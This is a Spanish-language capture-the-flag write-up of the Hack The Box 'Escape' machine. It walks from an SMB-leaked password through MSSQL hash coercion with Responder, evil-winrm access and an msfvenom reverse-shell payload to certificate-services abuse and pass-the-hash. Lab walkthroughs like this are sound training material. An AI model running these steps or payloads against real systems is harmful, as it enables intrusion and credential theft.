# EscapeWriteUp
Writeup de Escape HTB

Empezamos con un escaneo de nmap

~~~
sudo nmap -v -sS -oX vulnerabilidades.xml --stylesheet="https://svn.nmap.org/nmap/docs/nmap.xsl" --script=vuln 10.10.11.202 -Pn -p-
~~~

![imagen](https://user-images.githubusercontent.com/108554878/225091888-805b94d6-57ee-498d-af53-2c3c3c00bea3.png)


Vemos smb en el 445, mssql en el 1433 y winrm en el 5985

Primero que nada entramos de forma anónima a smb 

![imagen](https://user-images.githubusercontent.com/108554878/225092170-f200660f-a15e-40b8-ae23-c93d50935bc2.png)

Vemos varias carpetas

Entremos a public

![imagen](https://user-images.githubusercontent.com/108554878/225092256-ca7e5137-d942-40ca-a97e-8a878a277018.png)

Vemos un pdf

Dentro del pdf encontramos unas credenciales

![imagen](https://user-images.githubusercontent.com/108554878/225092313-54426388-d5f5-476b-a821-4dc22c83dfdf.png)

Con esto nos logueamos en mssql

![imagen](https://user-images.githubusercontent.com/108554878/225092412-f47b7273-20a7-4d2c-80dd-b48e7ecb6589.png)

Estando aqui leemos que se puede hacer en mssql para entrar a la máquina

https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

Después de intentar varias cosas que vienen en la documentación ponemos

~~~
exec master.dbo.xp_dirtree '\\{Mi IP}\any\thing'
~~~

Seteamos con responder algo que consiga las credenciales NTLMv2

~~~
sudo responder -I tun0 -w 
~~~

![imagen](https://user-images.githubusercontent.com/108554878/225092571-457a1cea-ac33-4e26-84c3-91273dd7b1c1.png)

Ahora crackeamos el hash

![imagen](https://user-images.githubusercontent.com/108554878/225092636-eb65cfa3-2f09-43ec-81e0-e86baa09556c.png)

Encontramos las credenciales y entramos con evilwinrm

![HTB](https://user-images.githubusercontent.com/108554878/225093047-66a8ac6e-ca60-4b73-aa5e-4236317578dd.png)

Entramos con evil-winrm

Vemos que hay un errorlog .BAK

Aquí encontramos las credenciales de Ryan.Cooper

![HTB](https://user-images.githubusercontent.com/108554878/225093457-d8d46db7-36ee-45a0-8b0d-e3299bb386db.png)

Con esto encontramos el user entrando desde evil-winrm

![HTB](https://user-images.githubusercontent.com/108554878/225094140-60254216-ca82-495b-aa7d-885bcf8614ad.png)

Cambio la sesión a meterpreter 

~~~
msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP de mi máquina} LPORT=1232 -f exe > xddd.exe 
~~~

Ejecutamos exploit/multi/handler y ejecutamos el .exe en la máquina

![imagen](https://user-images.githubusercontent.com/108554878/225094868-00bd831a-9d47-4a01-b2ec-85f9fa683d74.png)

Vemos los privilegios que tenemos

Calamos el exploit suggester y winpeas y no se encuentra nada interesante, después leyendo un poco encontré que se puede escalar privilegios con el uso de Active Directory Certificate Services

https://posts.specterops.io/certified-pre-owned-d95910965cd2
https://www.youtube.com/watch?v=ejmAIgxFRgM

Intentamos user certify.exe recomendado para esto, encontramos que es vulnerable

~~~
.\Certify.exe find /vulnerable
~~~

![imagen](https://user-images.githubusercontent.com/108554878/225095523-726d8e18-c2b8-4be6-ba06-48c637752fa4.png)


Al intentar aprovecharnos de esto da un error inesperado así que usamos certipy-ad que funciona también

~~~
certipy-ad find -vulnerable -stdout -u Ryan.Cooper@sequel.htb -p {Contraseña} -dc-ip 10.10.11.202
~~~

También nos encuentra la vulnerabilidad

Obtenemos el certificado .pfx

![imagen](https://user-images.githubusercontent.com/108554878/225095856-1153251a-5586-4bda-b75b-2514ded962a5.png)

Y con esto conseguimos el hash NTLM de la máquina, con esto no necesitamos tocar lsass, ni escalar para conseguirlo

![imagen](https://user-images.githubusercontent.com/108554878/225096019-cd865bf3-b1cc-4c24-b932-4d48fb15fc8d.png)

Nos da un error, investigando es porque tenemos el tiempo desconfigurado

![imagen](https://user-images.githubusercontent.com/108554878/225096143-6cd5d309-6fdb-4678-9dd7-bb721b5c8bd5.png)

Cambiamos el tiempo

Conseguimos el hash

![imagen](https://user-images.githubusercontent.com/108554878/225096267-eba487d6-1b64-4845-8f26-e685b15a76c9.png)


Hacemos un ataque pass-the-hash

![HTB](https://user-images.githubusercontent.com/108554878/225096498-bfd3bfeb-9b47-446e-a2b8-a5d9160bfebe.png)

Y Listo!

